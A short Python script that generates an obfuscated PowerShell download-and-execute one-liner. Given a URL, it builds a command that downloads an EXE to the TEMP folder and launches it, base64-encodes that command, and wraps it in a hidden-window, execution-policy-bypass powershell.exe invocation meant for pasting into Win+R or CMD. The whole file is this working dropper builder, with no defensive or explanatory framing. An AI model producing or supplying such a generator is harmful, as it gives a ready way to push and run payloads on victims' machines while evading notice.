import base64

def generate_downloader_one_liner(url):
    name = url.split('/')[-1]
    ps_script = f'''
$u="{url}";
$f="$env:TEMP\\{name}";
(New-Object Net.WebClient).DownloadFile($u,$f);
Start-Process $f
'''.strip()

    # Encode in UTF-16LE for PowerShell
    encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
    one_liner = f'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}'
    return one_liner

# Example usage
url = input("Enter direct EXE URL: ").strip()
print("\nOne-liner for Win+R or CMD:\n")
print(generate_downloader_one_liner(url))
